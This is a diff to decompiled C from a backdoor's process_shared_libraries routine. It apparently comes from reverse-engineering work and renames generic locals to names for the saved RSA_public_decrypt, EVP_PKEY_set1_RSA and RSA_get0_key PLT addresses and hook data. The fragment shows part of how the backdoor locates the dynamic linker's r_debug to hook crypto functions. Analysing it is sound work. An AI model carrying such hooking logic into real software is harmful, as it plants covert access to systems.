@@ -21,11 +21,11 @@ BOOL process_shared_libraries(backdoor_shared_libraries_data_t *data)
   backdoor_shared_libraries_data_t tmp_state;
   Elf64_Sym *r_debug_sym;
   uchar *debug_block;
-  void *local_30;
-  void *local_28;
-  void *local_20;
-  backdoor_hooks_data_t **local_18;
-  libc_imports_t *local_10;
+  void *saved_RSA_public_decrypt_plt;
+  void *saved_EVP_PKEY_set1_RSA_plt;
+  void *saved_RSA_get0_key_plt;
+  backdoor_hooks_data_t **saved_hooks_data_addr;
+  libc_imports_t *saved_libc_imports;
   
   r_debug_symbol = elf_symbol_get(data->elf_handles->dynamic_linker,STR_r_debug,STR_GLIBC_2_2_5);
   success = FALSE;
@@ -35,11 +35,11 @@ BOOL process_shared_libraries(backdoor_shared_libraries_data_t *data)
     success = FALSE;
     if (0 < *(int *)r_debug_addr) {
       r_debug_sym = (Elf64_Sym *)data->data;
-      local_30 = data->RSA_public_decrypt_plt;
-      local_28 = data->EVP_PKEY_set1_RSA_plt;
-      local_20 = data->RSA_get0_key_plt;
-      local_18 = data->hooks_data_addr;
-      local_10 = data->libc_imports;
+      saved_RSA_public_decrypt_plt = data->RSA_public_decrypt_plt;
+      saved_EVP_PKEY_set1_RSA_plt = data->EVP_PKEY_set1_RSA_plt;
+      saved_RSA_get0_key_plt = data->RSA_get0_key_plt;
+      saved_hooks_data_addr = data->hooks_data_addr;
+      saved_libc_imports = data->libc_imports;
       success = process_shared_libraries_map
                         (*(link_map **)(r_debug_addr + 8),(backdoor_shared_libraries_data_t *)&r_debug_sym
                         );
